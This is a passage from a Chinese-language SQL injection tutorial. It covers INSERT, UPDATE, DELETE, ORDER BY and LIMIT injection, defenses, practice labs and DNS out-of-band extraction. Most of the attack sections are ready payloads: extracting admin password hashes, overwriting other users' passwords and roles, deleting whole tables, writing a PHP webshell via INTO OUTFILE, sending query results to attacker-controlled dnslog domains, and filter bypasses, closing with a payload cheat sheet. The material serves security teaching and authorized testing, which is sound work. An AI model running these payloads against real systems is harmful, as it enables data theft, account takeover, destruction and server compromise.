##### 6. INSERT 信息获取完整示例

假设一个留言板功能，插入语句为：

```sql
INSERT INTO comments (username, content) VALUES ('$user', '$content')
```

**Step 1：获取数据库名**

```
content = test' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT DATABASE()))) AND '1'='1
→ 报错显示: XPATH syntax error: '~security'
```

**Step 2：获取表名**

```
content = test' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT GROUP_CONCAT(TABLE_NAME) FROM information_schema.TABLES WHERE TABLE_SCHEMA='security'))) AND '1'='1
→ 报错显示: XPATH syntax error: '~users,posts,comments'
```

**Step 3：获取列名**

```
content = test' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT GROUP_CONCAT(COLUMN_NAME) FROM information_schema.COLUMNS WHERE TABLE_SCHEMA='security' AND TABLE_NAME='users'))) AND '1'='1
→ 报错显示: XPATH syntax error: '~id,username,password,email'
```

**Step 4：获取数据**

```
content = test' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT CONCAT(username, ':', password) FROM security.users LIMIT 0,1))) AND '1'='1
→ 报错显示: XPATH syntax error: '~admin:5f4dcc3b5aa765d61d8327deb882cf99'
```

---

### 0x19 UPDATE 注入

UPDATE 注入的危险性最高，因为它可以直接修改数据库中的现有数据。

#### 典型漏洞场景

```php
// 修改密码的功能
$username = $_SESSION['username'];
$new_password = md5($_POST['new_password']);
$sql = "UPDATE users SET password = '$new_password' WHERE username = '$username'";
mysqli_query($conn, $sql);

// 管理员修改用户信息
$user_id = $_POST['user_id'];
$email = $_POST['email'];
$sql = "UPDATE users SET email = '$email' WHERE id = $user_id";
```

##### 1. 通过 SET 子句窃取数据

攻击者可以将自己的某个字段值修改为其他用户的敏感数据。**关键**：必须先用 `'` 闭合原有的字符串上下文，让子查询出现在引号**外部**，否则子查询会被当成普通字符串而不会执行。

```sql
-- 场景：修改自己的邮箱
-- 在 email 输入框中注入：
test', email=(SELECT password FROM users WHERE username='admin') WHERE id=1234 -- 

-- 实际执行：
UPDATE users SET email = 'test', email=(SELECT password FROM users WHERE username='admin') WHERE id=1234 -- ' WHERE id=456
```

**为什么之前那种写法不行？** 如果直接输入 `(SELECT ...)` 而不先闭合前面的单引号，拼接后变成：

```sql
UPDATE users SET email = '(SELECT password FROM users WHERE username='admin') ...'
```

此时子查询被包裹在一对单引号内部，数据库把它当纯粹的字符串字面量存储，**不会执行**。

而正确写法 `test', email=(SELECT ...) WHERE ...` 中：
1. `test'` 闭合了原有的左引号 `'`，并与 `email = 'test'` 的右引号配对
2. 接着的 `, email=(SELECT ...)` 在引号**外部**，是一个真正会被执行的 SQL 子查询
3. 最后的 `-- ` 注释掉原始 WHERE 条件，确保注入的子句生效

这样，用户 ID 1234 的 email 字段就被修改为 admin 的密码。如果 email 字段在个人资料页可见，攻击者就获取了 admin 的密码 hash。

> ⚠️ **注意**：
> - MySQL 的 UPDATE SET 子查询默认不能引用正在更新的同一张表。需要绕过时可考虑使用派生表。
> - 任何注入 payload 中，**子查询/函数调用必须出现在引号外部才会被数据库执行**，这是 SQL 注入中最基本的闭合原则。

##### 2. 修改其他用户的数据（核心威胁）

通过闭合 WHERE 条件来修改任意用户的数据：

```sql
-- 场景：修改自己的密码
-- 在 new_password 输入框中注入：
hacked123' WHERE username='admin' -- 

-- 实际执行：
UPDATE users SET password = 'hacked123' WHERE username='admin' -- ' WHERE id=123
```

这把 **admin 用户的密码**改成了 `hacked123`！

更危险的例子 —— 批量修改所有用户：

```sql
-- 输入：
hacked' WHERE 1=1 -- 

-- 实际执行：
UPDATE users SET password = 'hacked' WHERE 1=1 -- ' WHERE id=123
```

这会修改**所有用户**的密码。

##### 3. 多字段注入

如果 `SET` 后面有多列可控，攻击面更大：

```sql
-- 原始 SQL：
UPDATE users SET email = '$email', signature = '$signature' WHERE id = $id
```

攻击者在 `email` 处注入，劫持后面的字段：

```sql
-- 在 email 处输入：
test@test.com', signature = (SELECT password FROM users WHERE username='admin'), role = 'admin' WHERE id = (SELECT id FROM users WHERE username='attacker') -- 

-- 实际执行效果：将 attacker 用户的 role 改为 admin
UPDATE users SET email = 'test@test.com', signature = (SELECT password FROM users WHERE username='admin'), role = 'admin' WHERE id = (SELECT id FROM users WHERE username='attacker') -- ', signature = 'xxx' WHERE id=123
```

##### 4. UPDATE 报错注入

```sql
-- 在可注入的字段中输入：
test' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT DATABASE()))) AND '1'='1

-- 实际执行：
UPDATE users SET password = 'test' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT DATABASE()))) AND '1'='1' WHERE id=123
-- 错误信息：XPATH syntax error: '~database_name'
```

如果 password 是数字型字段（如 `age=25`），闭合方式稍有不同：

```sql
-- 数字型 UPDATE：
25 AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT DATABASE())))

-- 实际执行：
UPDATE users SET age = 25 AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT DATABASE()))) WHERE id=123
```

##### 5. UPDATE 盲注

```sql
-- 时间盲注：判断 admin 密码的第一位字符
test' OR IF(ASCII(SUBSTRING((SELECT password FROM users WHERE username='admin'), 1, 1)) = 97, SLEEP(3), 0) OR '

-- 布尔盲注：利用修改是否"成功/失败"的返回信息来判断
test' AND (SELECT LENGTH(password) FROM users WHERE username='admin') = 32 AND '1'='1
-- 如果修改成功，说明 admin 密码长度为 32
-- 如果修改失败，说明长度不是 32
```

---

### 0x20 DELETE 注入

DELETE 注入较为少见（因为删除操作通常不需要用户输入复杂数据），但一旦存在，危害等级极高。

#### 典型漏洞场景

```php
// 删除文章
$post_id = $_GET['id'];
$user_id = $_SESSION['user_id'];
$sql = "DELETE FROM posts WHERE id = $post_id AND user_id = $user_id";
mysqli_query($conn, $sql);
```

这是数字型注入的典型场景。核心目标是**注释掉后面的 `AND user_id = xxx` 限制条件**：

```sql
-- URL: delete.php?id=1 OR 1=1 -- 

-- 实际执行：
DELETE FROM posts WHERE id = 1 OR 1=1 -- AND user_id = 123
```

这会删除 posts 表中的**所有**记录！（`OR 1=1` 让 WHERE 条件始终为真）

> ⚠️ **极度危险**：DELETE 注入可能造成不可逆的数据丢失。在真实渗透测试中必须极度谨慎，建议先通过盲注确认注入点存在，而非直接执行破坏性 payload。

##### DELETE 报错注入

```sql
-- URL: delete.php?id=1 AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT DATABASE())))

-- 实际执行：
DELETE FROM posts WHERE id = 1 AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT DATABASE()))) AND user_id = 123
-- 错误信息：XPATH syntax error: '~database_name'
```

##### DELETE 盲注

```sql
-- 时间盲注
id=1 AND IF(ASCII(SUBSTRING(DATABASE(), 1, 1)) = 115, SLEEP(3), 0)

-- 布尔盲注：通过观察删除操作的返回信息（成功/失败）来判断
id=1 AND (SELECT LENGTH(password) FROM users WHERE username='admin') = 32
```

> ⚠️ **警告**：DELETE 注入的布尔盲注每次判断**都会实际删除一条数据**（当条件为真时删除，为假时不删），在真实环境中必须极其小心。建议优先使用时间盲注，因为 SLEEP 可以在 DELETE 执行前触发，且条件为真时不影响删除的 WHERE 逻辑。

##### 更安全的 DELETE 盲注技巧

利用 `AND` 的短路特性，将 SLEEP 放在前面：

```sql
-- 条件为真时：先 SLEEP 3 秒，再执行删除（不影响删除逻辑）
id=1 AND IF(ASCII(SUBSTRING(DATABASE(), 1, 1)) = 115, SLEEP(3), 1)

-- 条件为假时：IF 返回 1（不影响删除），不延时
id=1 AND IF(ASCII(SUBSTRING(DATABASE(), 1, 1)) = 999, SLEEP(3), 1)
```

---

### 0x21 ORDER BY / GROUP BY 注入

当 `ORDER BY` 或 `GROUP BY` 后面的列名/排序方式由用户输入控制时，存在注入风险。这种注入在排序功能、报表功能中尤为常见。

```php
// 典型的注入场景
$order = $_GET['order'];    // 用户可控的排序列
$dir = $_GET['dir'];        // 用户可控的排序方向
$sql = "SELECT * FROM products ORDER BY $order $dir";
mysqli_query($conn, $sql);
```

#### 判断是否存在 ORDER BY 注入

```sql
-- 正常请求（按 id 排序）：
?order=id&dir=ASC

-- 测试1：注入单引号
?order=id'

-- 测试2：使用子查询（如果报错或排序行为异常，说明存在注入）
?order=(SELECT 1)

-- 测试3：使用 SLEEP 测试（时间差异说明存在注入）
?order=(SELECT SLEEP(3))
```

#### 利用方式

##### 1. 布尔盲注（通过排序差异推断）

核心思路：根据条件真伪返回不同的排序结果，通过观察页面中记录的顺序来推断数据。

```sql
-- 判断数据库名第一个字符是否为 's'
-- 如果为真，按 id 排序；如果为假，按 username 排序
?order=IF(ASCII(SUBSTRING(DATABASE(), 1, 1)) = 115, id, username)
```

更隐蔽的方式（使用子查询干扰排序）：

```sql
-- 根据条件，让某条记录排到第一或最后
?order=(SELECT IF(ASCII(SUBSTRING(DATABASE(), 1, 1)) = 115, 1, (SELECT 1 UNION SELECT 2)))
```

##### 2. 时间盲注

```sql
?order=IF(ASCII(SUBSTRING(DATABASE(), 1, 1)) = 115, SLEEP(3), 1)
```

##### 3. 报错注入

当 ORDER BY 后面直接拼接了用户输入，且允许执行子查询时：

```sql
-- 使用 extractvalue
?order=EXTRACTVALUE(1, CONCAT(0x7e, (SELECT DATABASE())))

-- 使用 updatexml
?order=UPDATEXML(1, CONCAT(0x7e, (SELECT DATABASE())), 1)

-- 使用经典 floor + rand + group by
?order=(SELECT 1 FROM (SELECT COUNT(*), CONCAT((SELECT DATABASE()), FLOOR(RAND()*2)) AS x FROM information_schema.TABLES GROUP BY x) AS y)
```

注意：`ORDER BY` 后面的子查询必须用括号包裹。

##### 4. 利用 PROCEDURE ANALYSE()（MySQL 特有）

MySQL 的 `PROCEDURE ANALYSE()` 可以在 SELECT 末尾调用，某些情况下可以与 ORDER BY 结合：

```sql
-- MySQL 5.x 中，PROCEDURE ANALYSE 可在 ORDER BY 之后使用
?order=id LIMIT 1 PROCEDURE ANALYSE(EXTRACTVALUE(1, CONCAT(0x7e, (SELECT DATABASE()))), 1)
```

##### 5. GROUP BY 注入

与 ORDER BY 类似，GROUP BY 后的用户输入同样可被利用：

```sql
-- 原始 SQL
SELECT category, COUNT(*) FROM products GROUP BY $user_input

-- 报错注入 payload
?group=category, EXTRACTVALUE(1, CONCAT(0x7e, (SELECT DATABASE())))

-- 布尔盲注
?group=IF(ASCII(SUBSTRING(DATABASE(), 1, 1)) = 115, category, product_name)
```

---

### 0x22 LIMIT 注入

当 `LIMIT` 后面的参数可控时，存在注入风险。MySQL 5.x 中 `LIMIT` 后面可以跟 `PROCEDURE ANALYSE()` 和 `INTO OUTFILE`。

```php
// 典型的分页场景
$limit = $_GET['limit'];
$offset = $_GET['offset'];
$sql = "SELECT * FROM articles LIMIT $offset, $limit";
```

#### 利用方式

##### 1. PROCEDURE ANALYSE() 报错注入（MySQL 5.x）

```sql
-- 判断是否存在 LIMIT 注入
?limit=1 PROCEDURE ANALYSE(1,1)

-- 获取数据库名
?limit=1 PROCEDURE ANALYSE(EXTRACTVALUE(1, CONCAT(0x7e, (SELECT DATABASE()))), 1)

-- 获取表名
?limit=1 PROCEDURE ANALYSE(EXTRACTVALUE(1, CONCAT(0x7e, (SELECT GROUP_CONCAT(TABLE_NAME) FROM information_schema.TABLES WHERE TABLE_SCHEMA=DATABASE()))), 1)

-- 获取列名
?limit=1 PROCEDURE ANALYSE(EXTRACTVALUE(1, CONCAT(0x7e, (SELECT GROUP_CONCAT(COLUMN_NAME) FROM information_schema.COLUMNS WHERE TABLE_SCHEMA=DATABASE() AND TABLE_NAME='users'))), 1)
```

> ⚠️ **版本限制**：`PROCEDURE ANALYSE()` 在 MySQL 5.7.18 之后已被废弃，MySQL 8.0 中完全移除。

##### 2. UNION + LIMIT 联合注入

如果程序将 LIMIT 的值完整拼接到 SQL：

```sql
?limit=10 UNION SELECT 1,2,3,DATABASE(),5 -- 
```

##### 3. INTO OUTFILE 写文件（写 Webshell）

```sql
?limit=10 INTO OUTFILE '/var/www/html/shell.php' LINES TERMINATED BY '<?php system($_GET[1]);?>'
```

---

### 0x23 非查询注入总结

#### 各类注入难度与利用方式对比

| 注入类型 | 最佳利用方式 | 关键技巧 | 难度 |
|----------|--------------|----------|------|
| INSERT | 报错注入 / 子查询窃取 | 闭合 VALUES 子句，利用子查询或报错函数获取数据 | ⭐⭐⭐ |
| UPDATE | 报错注入 / 修改条件 | 闭合 SET 和 WHERE 子句，利用子查询将数据写入可见字段 | ⭐⭐⭐ |
| DELETE | 时间盲注 / 报错注入 | 注释或修改 WHERE 条件，注意避免误删数据 | ⭐⭐ |
| ORDER BY | 布尔盲注 / 时间盲注 | 使用 IF/CASE WHEN 控制排序顺序来判断条件 | ⭐⭐⭐ |
| GROUP BY | 报错注入 | 在 GROUP BY 列名后拼接报错函数 | ⭐⭐⭐ |
| LIMIT | PROCEDURE ANALYSE() | 拼接 PROCEDURE ANALYSE 实现报错注入 | ⭐⭐ |

#### 核心思路总结

1. **闭合原有语句**：用 `'`、`"`、`')` 等闭合原始 SQL 的上下文
2. **构造合法语法**：确保注入后的 SQL 语句语法完整、正确
3. **利用报错或盲注**：在无法直接看到结果时，用报错注入或盲注获取数据
4. **注意副作用**：INSERT/UPDATE/DELETE 注入会产生实际的数据库修改，测试时务必在授权靶场进行

#### 各语句注入的 payload 速记

```sql
-- ===== INSERT 注入 =====
-- 报错注入模板
attacker' AND EXTRACTVALUE(1, CONCAT(0x7e, (查询))) AND '1'='1
-- 子查询窃取数据
attacker', (SELECT password FROM users WHERE username='admin')) -- 
-- 多行插入
normal'), ('backdoor', 'backdoor_hash

-- ===== UPDATE 注入 =====
-- 修改他人密码
hacked' WHERE username='admin' -- 
-- 窃取数据到可见字段（关键：先闭合引号，让子查询在引号外部）
test', email=(SELECT password FROM users WHERE username='admin') WHERE id=1234 -- 
-- 报错注入
test' AND EXTRACTVALUE(1, CONCAT(0x7e, (查询))) AND '1'='1

-- ===== DELETE 注入 =====
-- 批量删除（危险！）
1 OR 1=1 -- 
-- 报错注入
1 AND EXTRACTVALUE(1, CONCAT(0x7e, (查询)))
-- 时间盲注
1 AND IF(条件, SLEEP(3), 1)

-- ===== ORDER BY 注入 =====
-- 布尔盲注（通过排序差异）
IF(条件, id, username)
-- 时间盲注
IF(条件, SLEEP(3), 1)
-- 报错注入（子查询形式）
(SELECT 1 FROM (SELECT COUNT(*), CONCAT((查询), FLOOR(RAND()*2)) AS x FROM information_schema.TABLES GROUP BY x) AS y)

-- ===== LIMIT 注入 =====
-- 报错注入（MySQL 5.x）
1 PROCEDURE ANALYSE(EXTRACTVALUE(1, CONCAT(0x7e, (查询))), 1)
```

---

## SQL 注入防御

### 0x24 核心防御原则

防御 SQL 注入的核心思想其实很简单：**永远不要信任用户的输入，永远将数据与代码分离。**

### 1. 参数化查询（Prepared Statement）⭐⭐⭐⭐⭐

这是**最有效**、**最推荐**的防御方式，也是防御 SQL 注入的黄金标准。

**原理**：参数化查询将 SQL 语句的结构和数据分开。数据库先编译 SQL 语句的结构（此时数据的位置用占位符 `?` 或 `:name` 标记），然后才将数据绑定到占位符上。这样，无论用户输入了什么内容，它都**只会被当作数据处理**，而不会被当作 SQL 代码执行。

#### PHP（MySQLi）

```php
// ✅ 安全写法：参数化查询
$stmt = $conn->prepare("SELECT * FROM users WHERE username = ? AND password = ?");
$stmt->bind_param("ss", $username, $password);
$stmt->execute();
$result = $stmt->get_result();
```

#### PHP（PDO）

```php
// ✅ 安全写法：PDO 参数化查询
$stmt = $pdo->prepare("SELECT * FROM users WHERE username = :username AND password = :password");
$stmt->execute(['username' => $username, 'password' => $password]);
```

#### Python

```python
# ✅ 安全写法：参数化查询
cursor.execute("SELECT * FROM users WHERE username = ? AND password = ?", (username, password))
```

#### Java

```java
// ✅ 安全写法：PreparedStatement
PreparedStatement stmt = conn.prepareStatement(
    "SELECT * FROM users WHERE username = ? AND password = ?"
);
stmt.setString(1, username);
stmt.setString(2, password);
ResultSet rs = stmt.executeQuery();
```

#### Node.js

```javascript
// ✅ 安全写法：参数化查询
const query = 'SELECT * FROM users WHERE username = ? AND password = ?';
connection.execute(query, [username, password], (err, results) => {
    // ...
});
```

### 2. 输入验证与过滤 ⭐⭐⭐⭐

在无法使用参数化查询的情况下（如动态表名、动态列名），必须对输入进行严格验证。

#### 白名单验证（推荐）

只允许特定的值：

```php
// ✅ 白名单验证
$allowed_tables = ['users', 'posts', 'comments'];
if (!in_array($table_name, $allowed_tables)) {
    throw new Exception("Invalid table name");
}
```

#### 类型转换

```php
// ✅ 确保输入是整数
$id = (int)$_GET['id'];
```

#### 黑名单过滤（不推荐，容易被绕过）

```php
// ❌ 黑名单过滤（总有遗漏的可能）
$input = str_replace(["'", '"', '--', ';'], '', $input);
```

### 3. 最小权限原则 ⭐⭐⭐⭐

数据库连接不应该使用高权限账户：

- ✅ 普通查询应用户只有 `SELECT` 权限
- ✅ 需要写入的应用户只有 `INSERT`、`UPDATE` 权限
- ❌ 永远不要在 Web 应用中使用 `root` 或 `DBA` 账户
- ❌ 禁止不需要的 `FILE` 权限

### 4. WAF（Web 应用防火墙）⭐⭐⭐

WAF 可以作为**辅助**防御手段，不能替代代码层面的防御：

- 云 WAF：Cloudflare、AWS WAF、阿里云 WAF 等
- 开源 WAF：ModSecurity、NAXSI 等
- 自建 WAF：基于 OpenResty/Nginx 的自定义规则

### 5. 其他辅助措施

#### 隐藏错误信息

生产环境中应该关闭详细的数据库错误显示：

```php
// ❌ 不安全：显示详细错误
ini_set('display_errors', 'On');

// ✅ 安全：隐藏错误信息
ini_set('display_errors', 'Off');
error_reporting(0);
```

#### 使用 ORM 框架

现代 ORM 框架（如 Django ORM、SQLAlchemy、Entity Framework、Hibernate、Sequelize 等）默认使用参数化查询，可以避免开发者写出不安全的 SQL。

```python
# ✅ Django ORM（自动参数化查询）
User.objects.filter(username=username, password=password)

# ❌ 即使使用 ORM，也要避免 raw SQL
User.objects.raw(f"SELECT * FROM users WHERE username = '{username}'")
```

#### 定期安全审计

- 使用自动化工具扫描 SQL 注入漏洞（如 SQLMap、Burp Suite）
- 代码审查时重点关注数据库操作相关代码
- 定期进行渗透测试

### 常见误区

#### 误区 1：过滤了单引号就安全了

**错误认知**："我把单引号都过滤掉，用户就没办法闭合 SQL 语句了。"

**现实**：很多注入场景不需要使用单引号：
- 数字型注入：`id=1 AND 1=1` —— 不需要引号
- 使用十六进制：`WHERE username = 0x61646D696E` —— 不需要引号
- 使用 `LIKE`、`IN` 等关键字

#### 误区 2：用了 HTTPS 就安全了

HTTPS 只负责传输加密，不负责应用层安全。

#### 误区 3：用了 WAF 就万事大吉

WAF 可以被绕过，且无法防御二次注入。

#### 误区 4：只过滤了 GET 参数，没过滤 POST/Cookie

所有用户输入来源都需要处理，包括 GET、POST、Cookie、HTTP 头等。

---

## 实战练习资源

### 在线靶场

| 平台 | 网址 | 说明 |
|------|------|------|
| **SQLi-Labs** | https://github.com/Audi-1/sqli-labs | 最经典的 SQL 注入靶场，包含各种类型的注入 |
| **DVWA** | http://www.dvwa.co.uk/ | 著名的 Web 漏洞靶场，包含 SQL 注入模块 |
| **bWAPP** | http://www.itsecgames.com/ | 包含 100+ 漏洞的 Web 应用靶场 |
| **PortSwigger Web Security Academy** | https://portswigger.net/web-security/sql-injection | 免费的在线 SQL 注入实验室 |
| **Hack The Box** | https://www.hackthebox.com/ | 渗透测试实战平台 |
| **TryHackMe** | https://tryhackme.com/ | 适合新手的网络安全学习平台 |
| **Sqli-hub** | https://github.com/skyblueee/sqli-hub | 一个简单的 SQL 注入靶场 |

### 推荐工具

| 工具 | 说明 |
|------|------|
| **SQLMap** | 自动化 SQL 注入检测和利用工具，支持几乎所有数据库和注入类型 |
| **Burp Suite** | 功能强大的 Web 渗透测试工具，可拦截、修改和分析 HTTP 请求 |
| **HackBar** | 浏览器插件，方便手动构造和发送 SQL 注入 payload |

### 0x11 DNSLog 带外注入（Out-of-Band）

**原理**：当页面没有任何输出回显（无论 True/False 页面都相同），且时间盲注也无法使用时，可以借助 DNS 解析日志来外传数据。攻击者让数据库向自己控制的域名发起 DNS 请求，数据被编码在域名中，通过 DNS 查询记录被记录下来。

**适用场景**：
- 页面无回显、无布尔差异、无法使用时间盲注
- 数据库支持发起网络请求（如 MySQL 的 `LOAD_FILE()`、MSSQL 的 `xp_dirtree`、Oracle 的 `UTL_HTTP`）
- 当前用户有相应权限

#### 工作流程

```
攻击者                   目标服务器                DNS Server (dnslog.cn)
  │                         │                          │
  │  注入 payload ──────────→                          │
  │  如: LOAD_FILE(CONCAT('\\', query, '.xxx.dnslog.cn\a'))
  │                         │                          │
  │                         │──── DNS 查询 ──────────→│
  │                         │    (数据编码在域名中)      │
  │                         │                          │
  │  ←── 查看 DNS 解析记录 ──────────────────────────  │
```

#### 常用 DNSLog 平台

| 平台 | 地址 | 说明 |
|-----|------|------|
| **CEYE** | [http://ceye.io](http://ceye.io) | 国内常用，支持 DNS 和 HTTP |
| **DNSLog.cn** | [http://dnslog.cn](http://dnslog.cn) | 轻量级，无需注册 |
| **Burp Collaborator** | Burp Suite 自带 | 专业版功能 |

#### MySQL DNSLog 注入

MySQL 利用 `LOAD_FILE()` 函数发起 UNC 路径请求来触发 DNS 查询。

**前提条件**：
- MySQL 用户有 `FILE` 权限
- **Windows 系统**（Linux 下 `LOAD_FILE` 不触发 UNC 请求）
- `secure_file_priv` 未限制 LOAD_FILE

```sql
-- 获取当前数据库名
id=1 AND LOAD_FILE(CONCAT('\\\\', DATABASE(), '.xxxx.dnslog.cn\\a'))

-- 获取当前用户
id=1 AND LOAD_FILE(CONCAT('\\\\', USER(), '.xxxx.dnslog.cn\\a'))

-- 获取数据库版本
id=1 AND LOAD_FILE(CONCAT('\\\\', @@VERSION, '.xxxx.dnslog.cn\\a'))
```

**解释**：在 Windows 中，`\\host\share` 格式的路径会触发 SMB 协议，Windows 会尝试解析 `host` 的 DNS 名称。将查询结果拼接到域名中，DNSLog 平台就会记录下包含数据的 DNS 查询。

**带子查询的完整示例**：

```sql
id=1 AND LOAD_FILE(CONCAT('\\\\',
  (SELECT GROUP_CONCAT(TABLE_NAME) FROM information_schema.TABLES
   WHERE TABLE_SCHEMA='security'),
'.xxxx.dnslog.cn\\test'))
```

#### MSSQL DNSLog 注入

SQL Server 提供了多种方式来触发 DNS 请求：

```sql
-- 方式1：xp_dirtree（需要 xp_cmdshell 权限）
id=1; DECLARE @host varchar(1024);
SELECT @host = CONCAT((SELECT db_name()), '.xxxx.dnslog.cn');
EXEC('master..xp_dirtree "\\' + @host + '\a"');

-- 方式2：xp_fileexist
id=1; DECLARE @host varchar(1024);
SELECT @host = CONCAT((SELECT db_name()), '.xxxx.dnslog.cn');
EXEC('master..xp_fileexist "\\' + @host + '\a"');
```

#### Oracle DNSLog 注入

Oracle 通过 `UTL_HTTP` 或 `UTL_INADDR` 发起网络请求：

```sql
-- 使用 UTL_HTTP（需要网络权限）
id=1 AND UTL_HTTP.REQUEST('http://' || (SELECT banner FROM v$version WHERE rownum=1) || '.xxxx.dnslog.cn') = 1

-- 使用 UTL_INADDR.GET_HOST_ADDRESS
id=1 AND UTL_INADDR.GET_HOST_ADDRESS('' || (SELECT banner FROM v$version WHERE rownum=1) || '.xxxx.dnslog.cn') = 1
```

#### PostgreSQL DNSLog 注入

PostgreSQL 没有直接的 DNS 请求函数，但可以通过 COPY 命令实现：

```sql
-- 需要超级用户权限
DROP TABLE IF EXISTS dns;
CREATE TABLE dns (data text);
COPY dns FROM '\\' || (SELECT current_database()) || '.xxxx.dnslog.cn\a';
```

#### Linux 环境下的替代方案

Linux 下 `LOAD_FILE` 不会触发 UNC 请求，可通过 HTTP 请求外传数据：

```sql
-- 使用 INTO OUTFILE 写入文件（需要 FILE 权限）
id=1 UNION SELECT 1,2,3 INTO OUTFILE '/var/www/html/dns.php'
LINES TERMINATED BY '<?php file_get_contents("http://xxxx.dnslog.cn/" . DATABASE());?>'
```

---

## 附录：常用 Payload 速查表

### 判断注入

```
'                   单引号测试
"                   双引号测试
')                  带括号闭合测试
")                  同上
' OR '1'='1         闭合后永真条件
' OR '1'='1' --     带注释的永真条件
1' AND '1'='1       闭合后永真条件
1' AND '1'='2       闭合后永假条件
```

### 确定字段数

```
ORDER BY 1
ORDER BY 2
ORDER BY 3
...
ORDER BY n          （直到报错）
```

### 获取基本信息

```
UNION SELECT 1,@@VERSION,3
UNION SELECT 1,DATABASE(),3
UNION SELECT 1,USER(),3
UNION SELECT 1,@@datadir,3
```

### 绕过过滤

```
UNION SELECT        →   UNI/**/ON SEL/**/ECT
OR 1=1              →   || 1=1
AND 1=1             →   && 1=1
空格                 →   /**/ 或 +
=                   →   LIKE 或 IN
'                   →   0x 十六进制编码
```

### 报错注入

```
EXTRACTVALUE(1, CONCAT(0x7e, (查询语句)))
UPDATEXML(1, CONCAT(0x7e, (查询语句)), 1)
```

### 时间盲注

```
IF((条件), SLEEP(5), 0)
CASE WHEN (条件) THEN SLEEP(5) ELSE 0 END
```

---

> **最后的话**：SQL 注入是 Web 安全中最基础也最重要的漏洞之一。理解它的原理不仅有助于进行安全测试，更重要的是能帮助开发者在编写代码时避免引入此类漏洞。**安全不是一种功能，而是一种思维方式。**

*学习 SQL 注入的最佳路径：先在本地靶场（如 SQLi-Labs）逐个练习每一种注入类型，理解每个 payload 为什么生效，然后尝试在真实授权环境下应用所学知识。切记：未经授权的渗透测试是违法行为。*
